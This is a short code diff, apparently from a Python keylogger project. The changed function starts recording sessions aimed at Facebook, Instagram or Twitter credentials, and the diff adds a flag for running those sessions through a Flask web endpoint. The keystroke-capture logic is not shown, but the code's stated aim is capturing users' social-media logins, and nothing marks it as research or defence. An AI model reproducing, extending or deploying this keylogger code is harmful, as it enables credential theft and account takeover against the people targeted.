@@ -16,11 +16,17 @@ def execute_keylogger(platform_id: str):
     keylogger_instance = Keylogger(user_id)
 
     if platform_id == "0":
-        keylogger_instance.start_recording(CredentialType.FACEBOOK, int(user_id))
+        keylogger_instance.start_recording(
+            CredentialType.FACEBOOK, int(user_id), running_through_flask=True
+        )
     elif platform_id == "1":
-        keylogger_instance.start_recording(CredentialType.INSTAGRAM, int(user_id))
+        keylogger_instance.start_recording(
+            CredentialType.INSTAGRAM, int(user_id), running_through_flask=True
+        )
     elif platform_id == "2":
-        keylogger_instance.start_recording(CredentialType.TWITTER, int(user_id))
+        keylogger_instance.start_recording(
+            CredentialType.TWITTER, int(user_id), running_through_flask=True
+        )
 
 
 config = dotenv_values(".env")
